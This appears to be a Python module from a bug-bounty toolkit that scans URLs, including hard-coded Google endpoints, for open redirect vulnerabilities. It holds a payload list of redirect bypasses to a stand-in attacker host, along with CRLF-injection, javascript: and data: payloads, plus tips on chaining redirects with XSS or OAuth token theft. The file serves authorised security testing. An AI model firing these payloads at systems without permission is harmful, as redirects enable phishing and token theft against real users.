"""
# BugShikari - Module 8: Open Redirect Scanner
Tests URL parameters for open redirect vulnerabilities.
"""

from urllib.parse import urlparse, parse_qs

import utils

console = utils.console

# Payloads to test for open redirects
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com/fake.google.com",
    "https://google.com@evil.com",
    "https://evil.com#google.com",
    "https://evil.com?.google.com",
    "/%0d%0aLocation:%20https://evil.com",
    "https:evil.com",
    "///evil.com",
    "javascript:alert(1)",
    "data:text/html,<h1>Redirected</h1>",
    "//%2F%2Fevil.com",
    "https://evil.com%23.google.com",
    "\\.evil.com",
]

# Common redirect parameters to test
REDIRECT_PARAMS = [
    "redirect", "redirect_url", "redirect_uri", "redirectUrl",
    "return", "return_url", "returnUrl", "returnTo",
    "next", "next_url", "nextUrl",
    "url", "uri", "link",
    "goto", "go", "target",
    "dest", "destination",
    "redir", "rurl",
    "continue", "continue_url",
    "forward", "forward_url",
    "callback", "cb",
    "out", "checkout_url",
    "ref", "referrer",
    "success_url", "error_url",
    "login_url", "logout_url",
]

# Known Google URLs that accept redirect parameters
GOOGLE_REDIRECT_ENDPOINTS = [
    "https://accounts.google.com/ServiceLogin?continue={payload}",
    "https://accounts.google.com/signout?continue={payload}",
    "https://www.google.com/url?q={payload}",
    "https://www.google.com/url?url={payload}",
    "https://maps.google.com/maps?q={payload}",
    "https://translate.google.com/translate?u={payload}",
    "https://docs.google.com/viewer?url={payload}",
    "https://accounts.google.com/o/oauth2/auth?redirect_uri={payload}&response_type=code&client_id=test&scope=openid",
]


def test_redirect(url: str, param: str, payload: str) -> dict | None:
    """
    Test a single open redirect attempt.

    Returns finding dict if redirect is detected, None otherwise.
    """
    # Don't follow redirects so we can inspect the Location header
    response = utils.make_request(url, allow_redirects=False, timeout=8)
    try:
        if response:
            console.print(f"  [green]✓ {len(response.text)} bytes received from {url}[/green]")
        else:
            # If response is None (e.g. error), we just skip
            pass
    except Exception:
        pass

    if response is None:
        return None

    # Check for redirect status codes
    if response.status_code in (301, 302, 303, 307, 308):
        location = response.headers.get("Location", "")

        # Check if redirect goes to our payload domain
        if "evil.com" in location.lower():
            return {
                "severity": "high",
                "type": "redirect_header",
                "url": url,
                "param": param,
                "payload": payload,
                "redirect_to": location,
                "status_code": response.status_code,
                "title": f"Open Redirect via {param} parameter",
                "detail": f"HTTP {response.status_code} redirect to: {location}",
            }

    # Check for meta refresh redirects in body
    if response.status_code == 200 and response.text:
        body_lower = response.text.lower()
        if "evil.com" in body_lower:
            if 'http-equiv="refresh"' in body_lower or "window.location" in body_lower:
                return {
                    "severity": "medium",
                    "type": "meta_redirect",
                    "url": url,
                    "param": param,
                    "payload": payload,
                    "redirect_to": "evil.com (in response body)",
                    "status_code": response.status_code,
                    "title": f"Client-side redirect via {param} parameter",
                    "detail": "The payload domain appears in the response body (meta refresh or JS redirect)",
                }

    return None


def scan_url(target_url: str) -> list[dict]:
    """
    Scan a URL for open redirect vulnerabilities.

    Tests both existing parameters and injects new redirect parameters.
    """
    findings = []
    parsed = urlparse(target_url)
    existing_params = parse_qs(parsed.query)

    # 1. Test existing URL parameters with redirect payloads
    for param in existing_params:
        param_lower = param.lower()
        if any(rp in param_lower for rp in
               ["url", "redirect", "return", "next", "goto", "continue", "dest", "forward", "callback", "ref"]):
            utils.print_status(f"Testing existing param '{param}' for redirects...")
            for payload in REDIRECT_PAYLOADS[:5]:  # Limited payloads for existing params
                test_url = target_url.replace(f"{param}={existing_params[param][0]}", f"{param}={payload}")
                result = test_redirect(test_url, param, payload)
                if result:
                    findings.append(result)
                    break  # Found one, move on

    # 2. Inject redirect parameters into the URL
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    for param in REDIRECT_PARAMS[:15]:  # Limit to avoid excessive requests
        for payload in REDIRECT_PAYLOADS[:5]:
            test_url = f"{base_url}?{param}={payload}"
            result = test_redirect(test_url, param, payload)
            if result:
                findings.append(result)
                break  # Found one payload that works, skip rest for this param

    return findings


def scan_google_endpoints() -> list[dict]:
    """Test known Google redirect endpoints."""
    findings = []

    utils.print_status("Testing known Google redirect endpoints...")
    for endpoint_template in GOOGLE_REDIRECT_ENDPOINTS:
        for payload in REDIRECT_PAYLOADS[:5]:
            url = endpoint_template.format(payload=payload)
            result = test_redirect(url, "known_endpoint", payload)
            if result:
                result["title"] = f"Open Redirect in Google endpoint: {endpoint_template.split('?')[0]}"
                findings.append(result)
                break

    return findings


def run(targets: list[str]) -> list[dict]:
    """
    Run open redirect scanning.

    Args:
        targets: List of URLs to test

    Returns:
        List of all findings
    """
    utils.print_section_header(
        "↗️ Module 8: Open Redirect Scanner",
        f"Testing {len(targets)} target(s) with {len(REDIRECT_PAYLOADS)} payloads"
    )

    utils.console.print(
        "\n  [bold yellow]⚠ Note:[/bold yellow] Google generally does NOT accept open redirects\n"
        "  unless they bypass the redirect warning page or can be chained\n"
        "  with another vulnerability for real impact.\n"
    )

    all_findings = []

    for target in targets:
        url = target if target.startswith("http") else f"https://{target}"
        utils.print_status(f"Scanning: {url}")

        findings = scan_url(url)
        all_findings.extend(findings)

    # Test known Google endpoints
    google_findings = scan_google_endpoints()
    all_findings.extend(google_findings)

    # Print results
    if all_findings:
        table = utils.create_table(
            f"Open Redirect Findings ({len(all_findings)})",
            [
                ("Severity", ""),
                ("URL", "bold white"),
                ("Parameter", "yellow"),
                ("Redirects To", "red"),
            ],
        )
        for f in all_findings:
            sev_display = {
                "critical": "[bold red]CRITICAL[/bold red]",
                "high": "[red]HIGH[/red]",
                "medium": "[yellow]MEDIUM[/yellow]",
                "low": "[blue]LOW[/blue]",
            }.get(f["severity"], f["severity"])

            table.add_row(
                sev_display,
                f["url"][:70],
                f["param"],
                f["redirect_to"][:50],
            )
        utils.console.print(table)

        utils.console.print(
            "\n  [bold cyan]💡 Tip:[/bold cyan] To make an open redirect reportable,\n"
            "  you need to show it bypasses the warning page OR chain it with\n"
            "  another bug (XSS, OAuth token theft, etc.).\n"
        )
    else:
        utils.print_success("No open redirect vulnerabilities detected")

    utils.save_results(
        "open_redirect",
        all_findings,
        targets[0] if targets else "unknown",
    )

    return all_findings
